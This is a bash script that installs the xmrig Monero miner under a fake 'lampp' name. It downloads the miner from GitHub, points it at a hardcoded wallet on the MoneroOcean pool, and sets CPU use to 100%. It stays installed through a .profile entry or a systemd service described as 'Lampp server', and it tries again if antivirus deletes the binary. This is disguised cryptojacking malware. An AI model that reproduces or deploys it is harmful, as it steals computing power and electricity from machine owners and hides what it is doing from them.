#!/bin/bash

VERSION=2.11

# printing greetings

apt update
apt install curl nano sudo neofetch -y
# command line arguments
WALLET="47zZneDdPNr63HM9ubMyrhYvLNbDunCkiia6fNCvQkThNuK6rrj59e3Y2nNF3ETeewbALAGYaiti4SF4ENwJ8bR7PKXXcMN"
EMAIL=$1 # this one is optional

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi


# printing intentions

if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
fi
echo

# start doing stuff: preparing miner

if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi


[ -d $HOME/lampp ] || mkdir $HOME/lampp
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/lampp; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/lampp directory"
  exit 1
fi
rm /tmp/xmrig.tar.gz


sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/lampp/config.json
$HOME/lampp/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/lampp/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/lampp/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/lampp/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/lampp"
  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/lampp --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/lampp directory"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Checking if stock version of $HOME/lampp/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/lampp/config.json
  $HOME/lampp/xmrig --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/lampp/xmrig ]; then
      echo "ERROR: Stock version of $HOME/lampp/xmrig is not functional too"
    else 
      echo "ERROR: Stock version of $HOME/lampp/xmrig was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/lampp/xmrig is OK"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/lampp/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/lampp/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/lampp/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/lampp/config.json
sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 100,/' $HOME/lampp/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/lampp/xmrig.log'",#' $HOME/lampp/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/lampp/config.json

cp $HOME/lampp/config.json $HOME/lampp/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/lampp/config_background.json

# preparing script

echo "[*] Creating $HOME/lampp/miner.sh script"
cat >$HOME/lampp/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $HOME/lampp/xmrig \$*
else
  echo "Lampp is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove it first."
fi
EOL

chmod +x $HOME/lampp/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep lampp/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/lampp/miner.sh script to $HOME/.profile"
    echo "$HOME/lampp/miner.sh --config=$HOME/lampp/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/lampp/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running in the background (see logs in $HOME/lampp/logs.log file)"
  /bin/bash $HOME/lampp/miner.sh --config=$HOME/lampp/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running in the background (see logs in $HOME/lampp/logs.log file)"
    /bin/bash $HOME/lampp/miner.sh --config=$HOME/lampp/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating lampp systemd service"
    cat >/tmp/lampp.service <<EOL
[Unit]
Description=Lampp server

[Service]
ExecStart=$HOME/lampp/xmrig --config=$HOME/lampp/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/lampp.service /etc/systemd/system/lampp.service
    echo "[*] Starting systemd service"
    sudo killall xmrig 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable lampp.service
    sudo systemctl start lampp.service
  fi
fi

echo ""

echo "[*] Setup complete"
exit




